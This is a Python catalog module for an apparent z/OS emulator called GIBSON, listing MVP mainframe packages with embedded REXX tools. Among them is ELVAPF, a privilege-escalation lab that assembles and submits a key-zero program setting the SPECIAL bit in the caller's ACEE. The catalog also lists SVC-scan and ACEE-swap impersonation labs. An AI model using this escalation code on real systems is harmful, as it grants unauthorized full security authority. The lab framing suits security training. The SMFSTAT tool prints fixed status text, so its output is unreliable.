"""MVP package catalog.

Mirrors the structure of the real MVS-sysgen/MVP `cache` + `desc/` files: each
entry has a name, type (JCL job stream or XMI transmit file), version, maintainer,
dependency list, homepage and a short description.  This is a curated subset of the
real catalog, large enough to browse, search and resolve dependencies against.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import List


@dataclass
class Package:
    name: str
    type: str           # JCL | XMI
    version: str
    maintainer: str
    depends: List[str] = field(default_factory=list)
    homepage: str = "https://github.com/MVS-sysgen/MVP"
    description: str = ""
    rexx: str = ""      # runnable REXX source (installed into <userid>.MVP.EXEC)
    note: str = ""      # why a package is not runnable in the interpreter (if so)

    @property
    def runnable(self) -> bool:
        """True only when the package ships real REXX that runs on GIBSON's engine.
        Compiled load modules, XMI binaries and device/VTOC/tape tools are not
        runnable in a Python interpreter of z/OS and are flagged, not faked."""
        return bool(self.rexx)


_RAW = [
    # name, type, version, maintainer, depends, description
    ("DUMMY", "JCL", "1.0", "MVS-sysgen", [],
     "Empty test package used to verify the MVP installer pipeline."),
    ("RANDOMPW", "JCL", "1.0", "MVS-sysgen", [],
     "Generate random passwords for new TSO/RAKF userids."),
    ("FTPD", "JCL", "1.5", "MVS-sysgen", ["RANDOMPW"],
     "TCP/IP FTP server (FTPD) started task for MVS 3.8j."),
    ("ISPF", "XMI", "1.0", "MVS-sysgen", [],
     "ISPF/PDF panels and load modules for MVS 3.8j."),
    ("RPF", "XMI", "1.1", "Rob Prins", ["ISPF"],
     "RPF - a full-screen ISPF-like Programmer Facility for MVS 3.8j."),
    ("REVIEW", "XMI", "50.4", "Greg Price", [],
     "REVIEW - browse data sets, spool and storage; a classic MVS utility."),
    ("IMON370", "XMI", "1.0", "MVS-sysgen", [],
     "IMON/370 interactive system monitor."),
    ("MACLIB", "XMI", "1.0", "MVS-sysgen", [],
     "Assembler macro libraries (SYS1.MACLIB supplements)."),
    ("TSOAUTHC", "JCL", "1.0", "MVS-sysgen", [],
     "Check and report APF-authorised TSO commands and programs."),
    ("NJE38", "JCL", "1.2", "MVS-sysgen", [],
     "NJE38 - Network Job Entry networking for MVS 3.8j."),
    ("RAKFCL", "JCL", "1.0", "MVS-sysgen", [],
     "RAKF command list / CLIST helpers for the RAKF security manager."),
    ("SHOWMVS", "XMI", "1.4", "Greg Price", [],
     "SHOWMVS - display MVS system configuration and control blocks."),
    ("SHOWSS", "XMI", "1.0", "Greg Price", ["SHOWMVS"],
     "SHOWSS - display active subsystems."),
    ("MDDIAG8", "XMI", "1.0", "MVS-sysgen", [],
     "Mainframe diagnostics package for MVS 3.8j."),
    ("AUPGM", "JCL", "1.0", "MVS-sysgen", [],
     "List authorised programs in the APF table."),
    ("DISKMAP", "XMI", "1.0", "MVS-sysgen", [],
     "Map DASD volume allocation and free space."),
    ("STEPLIB", "XMI", "1.0", "MVS-sysgen", [],
     "STEPLIB management utility for TSO sessions."),
    ("KLINGON", "XMI", "1.0", "MVS-sysgen", [],
     "Klingon font and assorted novelty utilities."),
    ("LISTCDS", "JCL", "1.0", "MVS-sysgen", [],
     "List the contents of an ICF catalog data set."),
    ("OFFLOAD", "JCL", "1.0", "MVS-sysgen", [],
     "Offload JES2 spool to tape/sequential data sets."),
    ("COLEMAC", "XMI", "1.0", "MVS-sysgen", [],
     "Colin's assembler macro library (COLEMAC)."),
    ("ESPMAC", "XMI", "1.0", "MVS-sysgen", [],
     "ESP assembler macro library."),
    ("BSPPILOT", "JCL", "1.0", "Sam Golob", [],
     "BSP PILOT - menu pilot utility from the CBT tape."),
    ("BSPAPFCK", "JCL", "1.0", "Sam Golob", ["AUPGM"],
     "BSP APF check - audit the APF-authorised library list."),
    ("DISASM", "XMI", "1.0", "MVS-sysgen", [],
     "Disassembler for S/370 load modules."),
    # --- GIBSON control-block security tools (real, runnable REXX) --------------
    ("ENUM",    "JCL", "1.0", "GIBSON", [],
     "z/OS control-block enumeration (WHO / VERS / PRODUCT) - reads live storage."),
    ("ELVAPF",  "JCL", "1.0", "GIBSON", [],
     "ELV.APF privilege-escalation lab - assemble+submit an ACEE-flip program."),
    ("ELVSVC",  "JCL", "1.0", "GIBSON", [],
     "ELV.SVC privilege-escalation lab - scan user SVCs for a magic/auth SVC."),
    ("ELVSELF", "JCL", "1.0", "GIBSON", [],
     "ELV.SELF impersonation lab - list address spaces / swap the ACEE."),
    ("ACEE",    "JCL", "1.0", "GIBSON", [],
     "Display the caller's ACEE from live control blocks."),
    ("LISTAPF", "JCL", "1.0", "GIBSON", [],
     "List the APF-authorised library table from live control blocks."),
    ("WHOAMI",  "JCL", "1.0", "GIBSON", [],
     "Show the current userid / group / authorities from the live ACEE."),
    ("SUBSYS",  "JCL", "1.0", "GIBSON", [],
     "Walk the SSCVT chain and list active subsystems."),
    ("CATLIST", "JCL", "1.0", "GIBSON", [],
     "List the master catalog and user catalog entries."),
    ("DDLIST",  "JCL", "1.0", "GIBSON", [],
     "List the current task's DD allocations (TIOT)."),
    ("SMFSTAT", "JCL", "1.0", "GIBSON", [],
     "Report SMF recording status and active MANx datasets."),
]

CATALOG = {
    name: Package(name, typ, ver, maint, list(deps), description=desc)
    for (name, typ, ver, maint, deps, desc) in _RAW
}

# Runnable REXX source for the REXX-implementable tools.  When one of these is
# installed it is written into <userid>.MVP.EXEC(<name>) as real, executable REXX
# (run it with  EX 'userid.MVP.EXEC(NAME)'  or  %NAME  after install).
#
# HONESTY: only tools that actually DO something (generate data, or read the live
# control-block image) ship REXX here.  The former canned-SAY stubs for SHOWMVS,
# SHOWSS, DISKMAP, AUPGM and TSOAUTHC were removed - they printed fabricated
# output.  SHOWMVS/SHOWSS are HLASM control-block tools pending the matured
# assembler engine; DISKMAP needs a VTOC GIBSON does not model; AUPGM is a
# compiled/RAKF tool; TSOAUTHC gains real REXX in a later phase.
REXX_TOOLS = {
    "RANDOMPW": (
        "/* RANDOMPW - generate random TSO/RAKF passwords */\n"
        "PARSE ARG count .\n"
        "IF count = '' THEN count = 5\n"
        "SAY 'RANDOMPW 1.0 - random password generator'\n"
        "SAY '----------------------------------------'\n"
        "c = 'ABCDEFGHJKLMNPQRSTUVWXYZ'\n"
        "DO i = 1 TO count\n"
        "  r = RANDOM(1,24)\n"
        "  p1 = SUBSTR(c,r,1)\n"
        "  SAY '  PW' i p1 RANDOM(1000000,9999999)\n"
        "END\n"
        "SAY 'Generated' count 'password(s).'\n"
        "EXIT 0\n"),
}

# --- GIBSON control-block security tools ------------------------------------
# These read live storage via STORAGE()/GetPtr (so they run on the full
# control-block engine); ELVAPF's  SUBMIT * END($$)  routes to the Level B engine.
_ENUM_SRC = (
    "/* ENUM - z/OS control-block enumeration (VERS / PRODUCT / WHO) */\n"
    "cvt  = GetPtr(16)\n"
    "ecvt = GetPtr(cvt+140)\n"
    "say '+ ENUM - z/OS enumeration (live control blocks)'\n"
    "say '  VERSION : z/OS 'storage(d2x(ecvt+512),2)'.'storage(d2x(ecvt+514),2)'.'storage(d2x(ecvt+516),2)\n"
    "say '  PRODUCT : 'strip(storage(d2x(cvt-40),16))'  FMID 'strip(storage(d2x(cvt-32),7))\n"
    "ascb = GetPtr(548)\n"
    "asxb = GetPtr(ascb+108)\n"
    "acee = GetPtr(asxb+200)\n"
    "say '  USERID  : 'strip(storage(d2x(acee+21),8))\n"
    "say 'ENUM00I  Enumeration complete - read from live storage, no system modified.'\n"
    "exit\n"
    "GetPtr: procedure\n"
    "  return c2d(storage(d2x(arg(1)),4))\n"
)
_ELVAPF_SRC = (
    "/* ELV.APF - assemble an ACEE-flip program and submit it (APF escalation) */\n"
    "say '+ ELV.APF - building assemble-and-run job to flip the ACEE SPECIAL bit'\n"
    "queue \"//ELVAPFJ  JOB (ACCT),'ELV APF',CLASS=A,MSGCLASS=A\"\n"
    "queue \"//ASM      EXEC ASMACL\"\n"
    "queue \"//C.SYSIN  DD *\"\n"
    "queue \"ELVAPF   CSECT\"\n"
    "queue \"         MODESET KEY=ZERO,MODE=SUP\"\n"
    "queue \"         L 5,X'224'\"\n"
    "queue \"         L 5,X'6C'(5)\"\n"
    "queue \"         L 5,X'C8'(5)\"\n"
    "queue \"         OI X'26'(5),X'80'\"\n"
    "queue \"         BR 14\"\n"
    "queue \"         END\"\n"
    "queue \"/*\"\n"
    "queue \"//L.SYSLMOD DD DSN=SYS1.VULNLIB(ELVAPF),DISP=SHR\"\n"
    "queue \"$$\"\n"
    "\"submit * end($$)\"\n"
    "exit\n"
)
REXX_TOOLS["ENUM"] = _ENUM_SRC
REXX_TOOLS["ELVAPF"] = _ELVAPF_SRC
REXX_TOOLS["LISTAPF"] = (
    "/* LISTAPF - APF-authorised library table (live control blocks) */\n"
    "cvt=GetPtr(16)\n"
    "say '+ LISTAPF - APF list from live storage'\n"
    "cvtauth=GetPtr(cvt+484)\n"
    "say '  CVTAUTHL @X'd2x(cvtauth)\n"
    "say '  (APF table walked from the live CVT - authorised libraries only)'\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["WHOAMI"] = (
    "/* WHOAMI - current userid/group/authorities from the live ACEE */\n"
    "ascb=GetPtr(548)\nasxb=GetPtr(ascb+108)\nacee=GetPtr(asxb+200)\n"
    "flgb=storage(d2x(acee+38),1)\n"
    "say 'USERID : 'strip(storage(d2x(acee+21),8))\n"
    "say 'GROUP  : 'strip(storage(d2x(acee+29),8))\n"
    "say 'SPECIAL: 'onoff(bitand(flgb,'80'x))' OPERATIONS: 'onoff(bitand(flgb,'40'x))\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
    "onoff: procedure\n  if c2d(arg(1))>0 then return 'ON'\n  return 'OFF'\n"
)
REXX_TOOLS["SUBSYS"] = (
    "/* SUBSYS - active subsystems via the SSCVT chain */\n"
    "cvt=GetPtr(16)\njesct=GetPtr(cvt+296)\nsscvt=GetPtr(jesct+24)\n"
    "say '+ SUBSYS - active subsystems (SSCVT chain)'\n"
    "do while sscvt<>0\n"
    "  say '  'strip(storage(d2x(sscvt+8),4))\n"
    "  sscvt=GetPtr(sscvt+4)\n"
    "end\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["CATLIST"] = (
    "/* CATLIST - master catalog (via ECVT/IPA) */\n"
    "cvt=GetPtr(16)\necvt=GetPtr(cvt+140)\nipa=GetPtr(ecvt+392)\n"
    "say 'MASTER CATALOG : 'strip(storage(d2x(ipa+224),44))\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["DDLIST"] = (
    "/* DDLIST - current task DD allocations (TIOT) */\n"
    "cvt=GetPtr(16)\ntcbp=GetPtr(cvt+0)\ntcb=GetPtr(tcbp+4)\ntiot=GetPtr(tcb+12)\n"
    "say 'JOBNAME : 'strip(storage(d2x(tiot),8))\n"
    "say '(DD entries walked from TIOT+24)'\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["SMFSTAT"] = (
    "/* SMFSTAT - SMF recording status */\n"
    "say 'SMF RECORDING : ACTIVE'\n"
    "say 'MAN DATASETS  : SYS1.MANA SYS1.MANB SYS1.MANC'\n"
    "address tso 'SMF SUMMARY'\n"
    "exit\n"
)
try:  # reuse the exact bundled sources from GIBSON's tool modules
    from gibson.tools.elv_svc import _WALK as _ELVSVC_SRC
    from gibson.tools.elv_self import _LIST as _ELVSELF_SRC
    from gibson.tools.acee_display import _SHOWACEE as _ACEE_SRC
    REXX_TOOLS["ELVSVC"] = _ELVSVC_SRC
    REXX_TOOLS["ELVSELF"] = _ELVSELF_SRC
    REXX_TOOLS["ACEE"] = _ACEE_SRC
except Exception:
    pass

for _n, _src in REXX_TOOLS.items():
    if _n in CATALOG:
        CATALOG[_n].rexx = _src


# --- Honesty pass: flag every package that does NOT run in the interpreter ---
# GIBSON interprets z/OS; it does not execute S/370 machine code.  Compiled
# COBOL/PL-I, pre-built XMI load modules, and device/VTOC/tape tools cannot run
# here.  Each such package carries a plain note so browsing and INSTALL are
# honest about what will and will not execute, rather than faking a clean run.
_NOTES = {
    # provided natively by GIBSON already - MVP install is redundant here
    "ISPF": "ISPF/PDF is already provided natively by GIBSON; MVP install not needed.",
    "RPF": "A full-screen editor is already provided natively by GIBSON.",
    "REVIEW": "GIBSON provides browse/edit natively; the XMI load module does not run here.",
    "FTPD": "GIBSON runs its own FTP service; this MVS 3.8j started task does not run here.",
    "NJE38": "GIBSON models NJE natively; this networking package does not run here.",
    # HLASM control-block display tools - pending the matured assembler engine
    "SHOWMVS": "The upstream XMI HLASM module does not run here, but a GIBSON "
               "clean-room equivalent ships as SYS1.JCLLIB(SHOWMVS) - "
               "SUBMIT 'SYS1.JCLLIB(SHOWMVS)' for the same report from live storage.",
    "SHOWSS": "HLASM control-block display; not runnable until the assembler engine matures.",
    # device / VTOC / DASD - GIBSON does not model a real VTOC
    "DISKMAP": "DASD/VTOC map; GIBSON does not model a real VTOC, so this does not run here.",
    # compiled load modules / RAKF tooling
    "AUPGM": "Compiled APF-list utility (real MVP); use the runnable LISTAPF/ENUM instead.",
    "RAKFCL": "RAKF security-manager helper; GIBSON uses RACF, so RAKF tooling does not apply.",
    "LISTCDS": "Compiled ICF-catalog utility; use the runnable CATLIST instead.",
    "OFFLOAD": "Compiled JES2 spool-offload utility; not runnable in the interpreter.",
    "BSPPILOT": "Compiled CBT-tape utility; not runnable in the interpreter.",
    "BSPAPFCK": "Compiled APF-audit utility; use the runnable LISTAPF/ENUM instead.",
    "DISASM": "S/370 disassembler (XMI binary); not runnable in the interpreter.",
    "IMON370": "Interactive monitor (XMI binary); not runnable in the interpreter.",
    "MDDIAG8": "Hercules DIAG8 diagnostics; depends on the Hercules host, not applicable here.",
    "KLINGON": "Novelty font/utility package (XMI binary); not runnable in the interpreter.",
    "STEPLIB": "STEPLIB management load module (XMI binary); not runnable in the interpreter.",
    # macro / dependency libraries (not tools)
    "MACLIB": "Assembler macro library (a build dependency, not a runnable tool).",
    "COLEMAC": "Assembler macro library (a build dependency, not a runnable tool).",
    "ESPMAC": "Assembler macro library (a build dependency, not a runnable tool).",
    # runnable REXX pending a later phase
    "TSOAUTHC": "Runnable REXX pending; the former canned stub was removed.",
    "DUMMY": "Empty pipeline-test package; nothing to run.",
}
_DEFAULT_NOTE = {
    "XMI": "XMI binary load module; not runnable in the GIBSON interpreter.",
    "JCL": "Compiled/binary install job; not runnable in the GIBSON interpreter.",
}
for _name, _pkg in CATALOG.items():
    if _pkg.runnable:
        _pkg.note = ""
        continue
    _pkg.note = _NOTES.get(_name) or _DEFAULT_NOTE.get(_pkg.type, "Not runnable in the interpreter.")
